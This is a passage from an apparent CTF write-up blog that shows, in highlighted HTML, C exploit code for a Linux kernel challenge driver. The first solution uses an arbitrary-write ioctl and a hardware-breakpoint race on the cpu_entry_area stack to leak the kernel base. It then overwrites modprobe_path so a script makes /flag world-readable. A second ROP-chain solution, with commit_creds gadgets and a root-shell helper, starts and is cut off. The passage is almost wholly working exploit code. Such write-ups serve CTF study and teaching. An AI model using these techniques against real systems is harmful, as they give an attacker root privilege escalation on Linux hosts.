class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<span class="hljs-comment">/*è¿™é‡Œä¸ç»‘æ ¸é—®é¢˜ä¹Ÿä¸å¤§ğŸ¤”*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(CPU_ENTRY_AREA_DB_STACK_RCX_ADDR, <span class="hljs-number">0x80</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        uname(uts);<br>        <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>            write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> leak;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br>    <br>    mmap_addr = mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!mmap_addr)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br><br>    pipe(pipe_fd);<br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname)+<span class="hljs-number">0X20</span>, <span class="hljs-number">8</span>);<br>    kernel_offset = leak -  <span class="hljs-number">0xffffffff810e0b32</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    modprobe_path = modprobe_path + kernel_offset;<br>    arb_write(modprobe_path, <span class="hljs-number">0x7465672f706d742f</span>);<br>    arb_write(modprobe_path + <span class="hljs-number">8</span>, <span class="hljs-number">0x6c6c656873</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;# make fake file magic not found&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/getshell&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;# get flag&quot;</span>);<br>    <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (flag_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open flag failed!&quot;</span>);<br>    &#125;<br>    read(flag_fd, data, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] flag is %s\n&quot;</span>,data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202160016.png" style="zoom:50%;" /><h3 id="ropé“¾è§£æ³•"><a href="#ropé“¾è§£æ³•" class="headerlink" title="ropé“¾è§£æ³•"></a>ropé“¾è§£æ³•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-type">size_t</span> canary;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82e8b920</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810f8240</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82e8a820</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff820010b0</span> + <span class="hljs-number">54</span>;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff81852a3d</span>;<br><span class="hljs-type">size_t</span> ret = <span class="hljs-number">0xffffffff81000905</span>;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> rop_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> * mmap_addr;<br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810f8240</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82e8a820</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff820010b0</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint64_t</span> vul;<br>&#125;vuln;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> vul)</span><br>&#123;<br>    vuln note;<br>    note.addr = addr;<br>    note.vul = vul;<br>    ioctl(dev_fd ,<span class="hljs-number">0</span> , &amp; note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(CPU_ENTRY_AREA_DB_STACK_RCX_ADDR, <span class="hljs-number">0x10</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br>    <br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        <span class="hljs-keyword">switch</span> (step)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            uname(uts);<br>            <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>            &#123;<br>                <span 